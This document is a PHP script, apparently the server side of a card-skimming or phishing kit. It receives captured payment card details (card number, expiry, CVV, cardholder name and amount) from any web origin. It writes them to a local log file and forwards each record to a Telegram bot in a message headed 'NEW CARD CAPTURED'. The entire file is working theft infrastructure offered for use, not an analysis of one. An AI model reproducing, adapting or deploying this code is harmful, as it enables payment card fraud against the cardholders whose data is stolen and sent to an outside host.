<?php
require_once 'config.php';

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true);
    
    if ($input['action'] === 'capture_card') {
        $cardData = $input['data'];
        
        // Log to file for backup
        $logData = date('Y-m-d H:i:s') . " - " . json_encode($cardData) . "\n";
        file_put_contents('cards.log', $logData, FILE_APPEND | LOCK_EX);
        
        // Send to Telegram
        $message = "💳 *NEW CARD CAPTURED*\n\n";
        $message .= "👤 User: " . $cardData['user'] . "\n";
        $message .= "💰 Type: " . $cardData['type'] . "\n";
        $message .= "💳 Card: " . $cardData['cardNumber'] . "\n";
        $message .= "📅 Expiry: " . $cardData['expiry'] . "\n";
        $message .= "🔢 CVV: " . $cardData['cvv'] . "\n";
        $message .= "👤 Name: " . $cardData['cardholder'] . "\n";
        $message .= "💵 Amount: $" . $cardData['amount'] . "\n";
        $message .= "🕒 Time: " . date('Y-m-d H:i:s');
        
        $url = "https://api.telegram.org/bot" . TELEGRAM_BOT_TOKEN . "/sendMessage";
        $data = [
            'chat_id' => TELEGRAM_CHAT_ID,
            'text' => $message,
            'parse_mode' => 'Markdown'
        ];
        
        $options = [
            'http' => [
                'header' => "Content-type: application/x-www-form-urlencoded\r\n",
                'method' => 'POST',
                'content' => http_build_query($data)
            ]
        ];
        
        $context = stream_context_create($options);
        file_get_contents($url, false, $context);
        
        echo json_encode(['success' => true]);
    }
}
?>
